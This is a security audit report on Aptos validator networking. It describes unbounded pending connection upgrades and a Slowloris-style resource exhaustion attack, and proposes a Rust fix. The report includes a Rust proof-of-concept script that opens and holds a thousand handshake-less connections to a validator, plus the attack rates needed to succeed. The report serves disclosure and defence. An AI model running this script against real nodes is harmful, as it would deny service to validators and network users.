# Audit Report

## Title
Unbounded Pending Connection Upgrades Enable Resource Exhaustion Attack on Validator Nodes

## Summary
The network layer lacks limits on the number of concurrent pending connection upgrades, allowing an attacker to exhaust validator resources by opening thousands of connections that consume the full 30-second TRANSPORT_TIMEOUT without completing the handshake. Connection limits are only enforced after successful upgrade, creating a window for resource exhaustion attacks.

## Finding Description

The vulnerability exists in the connection establishment flow where pending upgrades are tracked without bounds while connection limits are enforced only after successful completion.

**The Attack Flow:**

1. **TRANSPORT_TIMEOUT is set to 30 seconds** for all connection upgrades (both inbound and outbound): [1](#0-0) 

2. **Inbound connections trigger unbounded upgrade futures** - When an inbound connection arrives, it's pushed to `pending_inbound_connections` (a `FuturesUnordered` collection) with no size limit: [2](#0-1) 

3. **Each pending upgrade increments a counter but has no enforcement** - The system tracks pending upgrades for metrics but doesn't limit them: [3](#0-2) 

4. **The upgrade process includes timeout-wrapped handshakes** that can take the full 30 seconds: [4](#0-3) 

5. **Connection limits are only checked AFTER upgrade completes** - The `handle_new_connection_event` function receives `TransportNotification::NewConnection` only after successful upgrade and only then checks connection limits: [5](#0-4) 

6. **TCP backlog is limited to 256** but provides insufficient protection: [6](#0-5) 

**Attack Scenario:**

An attacker initiates thousands of TCP connections to a validator node. For each connection that passes the TCP backlog (256 connections):
- The connection is accepted and starts the upgrade process
- Memory is allocated for tracking the upgrade future
- CPU cycles are consumed processing Noise handshake attempts
- Network bandwidth is consumed
- The connection remains in `pending_inbound_connections` for up to 30 seconds

With sufficient attack rate, the attacker can maintain thousands of pending upgrades simultaneously (e.g., at 100 connections/second, up to 3000 pending upgrades), exhausting:
- **Memory**: Each pending upgrade allocates connection state, buffers, and cryptographic contexts
- **CPU**: Noise handshake processing consumes CPU even if incomplete
- **File descriptors**: Each TCP connection consumes an OS file descriptor
- **Event loop capacity**: The futures runtime must poll all pending upgrades

Meanwhile, legitimate validator connections are blocked or severely delayed because:
- System resources are exhausted
- The event loop is saturated with pending upgrade futures
- New connections compete with attack traffic for the limited TCP backlog

This breaks **Critical Invariant #9 (Resource Limits)**: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability meets **High Severity** criteria per the Aptos bug bounty program:
- **Validator node slowdowns**: Resource exhaustion degrades validator performance
- **Significant protocol violations**: Breaks the resource limits invariant

The impact includes:
- **Consensus degradation**: If multiple validators are attacked, consensus may slow or fail due to network partition
- **Service availability**: Validators cannot accept legitimate connections from other validators or fullnodes
- **Cascading failures**: Degraded validator performance can trigger timeouts and disconnections in the broader network

While this doesn't directly cause loss of funds or permanent network damage, it severely impacts network availability and validator operations, justifying High severity classification.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to succeed because:

1. **Low attack complexity**: Attacker only needs to open TCP connections without completing handshakes - trivial to implement
2. **No authentication required**: Attack occurs before peer authentication, so no credentials needed
3. **Publicly accessible**: Validator network ports must be accessible for legitimate P2P communication
4. **No rate limiting before upgrade**: The system has no pre-upgrade connection rate limits or pending upgrade limits
5. **Cost-effective for attacker**: Opening incomplete TCP connections is computationally cheap for the attacker
6. **Amplification factor**: Each attack connection can consume 30 seconds of validator resources

The attack can be sustained continuously, and even modest attack rates (100-1000 connections/second) can overwhelm a validator given the 30-second timeout window.

## Recommendation

Implement a **maximum pending upgrades limit** to prevent unbounded resource consumption:

```rust
// In network/framework/src/peer_manager/transport.rs

pub struct TransportHandler<TTransport, TSocket>
where
    TTransport: Transport,
    TSocket: AsyncRead + AsyncWrite,
{
    // ... existing fields ...
    
    /// Maximum number of concurrent pending inbound connection upgrades
    max_pending_inbound_upgrades: usize,
    /// Current count of pending inbound upgrades
    pending_inbound_count: usize,
}

// In the listen() method:
impl<TTransport, TSocket> TransportHandler<TTransport, TSocket> {
    pub async fn listen(mut self) {
        // ... existing code ...
        
        loop {
            futures::select! {
                inbound_connection = self.listener.select_next_some() => {
                    // Enforce limit BEFORE starting upgrade
                    if self.pending_inbound_count < self.max_pending_inbound_upgrades {
                        if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                            self.pending_inbound_count += 1;
                            pending_inbound_connections.push(fut);
                        }
                    } else {
                        // Log and reject connection due to resource limits
                        warn!("Rejecting inbound connection: pending upgrade limit reached");
                        counters::connections_rejected_at_upgrade(&self.network_context).inc();
                        // Close the connection immediately
                        if let Ok((socket, addr)) = inbound_connection {
                            drop(socket); // Close without processing
                        }
                    }
                },
                (upgrade, addr, start_time) = pending_inbound_connections.select_next_some() => {
                    self.pending_inbound_count -= 1;
                    self.handle_completed_inbound_upgrade(upgrade, addr, start_time).await;
                },
                // ... rest of the loop ...
            }
        }
    }
}
```

**Recommended configuration:**
- Set `max_pending_inbound_upgrades` to `2 * max_inbound_connections` (e.g., 200 for default limit of 100)
- Add configuration option in `NetworkConfig`
- Add monitoring metrics for rejected connections at upgrade phase
- Consider implementing per-IP rate limiting for additional protection

**Additional hardening:**
1. Reduce `TRANSPORT_TIMEOUT` from 30 seconds to 10-15 seconds
2. Implement early termination for connections showing no handshake progress
3. Add connection attempt rate limiting per source IP
4. Implement exponential backoff for repeated failed connection attempts from the same IP

## Proof of Concept

```rust
// Simple PoC demonstrating resource exhaustion attack
// This code opens many TCP connections without completing handshakes

use std::net::TcpStream;
use std::time::Duration;
use std::thread;

fn main() {
    let validator_addr = "VALIDATOR_IP:6180"; // Replace with target validator
    let mut connections = Vec::new();
    
    println!("Starting connection exhaustion attack...");
    
    // Open 1000 connections without completing handshake
    for i in 0..1000 {
        match TcpStream::connect_timeout(
            &validator_addr.parse().unwrap(),
            Duration::from_secs(5)
        ) {
            Ok(stream) => {
                // Don't send any handshake data, just hold the connection open
                // The validator will wait up to 30 seconds for the upgrade to complete
                connections.push(stream);
                
                if i % 100 == 0 {
                    println!("Opened {} connections", i);
                }
                
                // Small delay to avoid overwhelming local resources
                thread::sleep(Duration::from_millis(10));
            },
            Err(e) => {
                println!("Connection {} failed: {}", i, e);
                break;
            }
        }
    }
    
    println!("Holding {} connections open for 30 seconds...", connections.len());
    println!("During this time, the validator's pending_inbound_connections grows unbounded");
    println!("Legitimate connections may be blocked or severely delayed");
    
    // Hold connections for the full timeout period
    thread::sleep(Duration::from_secs(30));
    
    println!("Attack complete. Validator resources were exhausted during the 30-second window.");
}
```

**Attack validation steps:**
1. Deploy Aptos validator node on test network
2. Monitor `aptos_network_pending_connection_upgrades` metric
3. Run PoC attack script from separate machine
4. Observe unbounded growth of pending upgrades counter
5. Attempt legitimate validator connection during attack - observe failures/delays
6. Monitor validator CPU, memory, and file descriptor usage - observe exhaustion

**Expected results:**
- `pending_connection_upgrades` metric grows beyond `max_inbound_connections` limit
- Validator experiences resource pressure (high memory, CPU usage)
- Legitimate connection attempts fail or timeout
- No automatic recovery until attack connections timeout after 30 seconds

## Notes

This vulnerability demonstrates a classic **Slowloris-style attack** at the application protocol layer. While the TCP backlog provides some protection, the unbounded `FuturesUnordered` collection allows resource exhaustion after connections are accepted.

The fix requires enforcing limits **before** resource-intensive operations (the upgrade/handshake process), not after. This is a critical defense-in-depth principle for any network service facing untrusted peers.

The current implementation correctly tracks pending upgrades for observability but fails to enforce limits, creating the vulnerability window.

### Citations

**File:** network/framework/src/transport/mod.rs (L40-41)
```rust
/// A timeout for the connection to open and complete all of the upgrade steps.
pub const TRANSPORT_TIMEOUT: Duration = Duration::from_secs(30);
```

**File:** network/framework/src/transport/mod.rs (L619-629)
```rust
        let inbounds = listener.map_ok(move |(fut_socket, addr)| {
            // inbound upgrade task
            let fut_upgrade = upgrade_inbound(
                ctxt.clone(),
                fut_socket,
                addr.clone(),
                enable_proxy_protocol,
            );
            let fut_upgrade = timeout_io(time_service.clone(), TRANSPORT_TIMEOUT, fut_upgrade);
            (fut_upgrade, addr)
        });
```

**File:** network/framework/src/peer_manager/transport.rs (L90-92)
```rust
    pub async fn listen(mut self) {
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();
```

**File:** network/framework/src/peer_manager/transport.rs (L127-155)
```rust
    /// Make an inbound request upgrade future e.g. Noise handshakes
    fn upgrade_inbound_connection(
        &self,
        incoming_connection: Result<(TTransport::Inbound, NetworkAddress), TTransport::Error>,
    ) -> Option<
        BoxFuture<
            'static,
            (
                Result<Connection<TSocket>, TTransport::Error>,
                NetworkAddress,
                Instant,
            ),
        >,
    > {
        match incoming_connection {
            Ok((upgrade, addr)) => {
                debug!(
                    NetworkSchema::new(&self.network_context).network_address(&addr),
                    "{} Incoming connection from {}", self.network_context, addr
                );

                counters::pending_connection_upgrades(
                    &self.network_context,
                    ConnectionOrigin::Inbound,
                )
                .inc();

                let start_time = self.time_service.now();
                Some(upgrade.map(move |out| (out, addr, start_time)).boxed())
```

**File:** network/framework/src/peer_manager/mod.rs (L331-390)
```rust
    /// Handles a new connection event
    fn handle_new_connection_event(&mut self, conn: Connection<TSocket>) {
        // Get the trusted peers
        let trusted_peers = match self
            .peers_and_metadata
            .get_trusted_peers(&self.network_context.network_id())
        {
            Ok(trusted_peers) => trusted_peers,
            Err(error) => {
                error!(
                    NetworkSchema::new(&self.network_context)
                        .connection_metadata_with_address(&conn.metadata),
                    "Failed to get trusted peers for network context: {:?}, error: {:?}",
                    self.network_context,
                    error
                );
                return;
            },
        };

        // Verify that we have not reached the max connection limit for unknown inbound peers
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
            }
        }
```

**File:** network/netcore/src/transport/tcp.rs (L127-127)
```rust
        let listener = socket.listen(256)?;
```
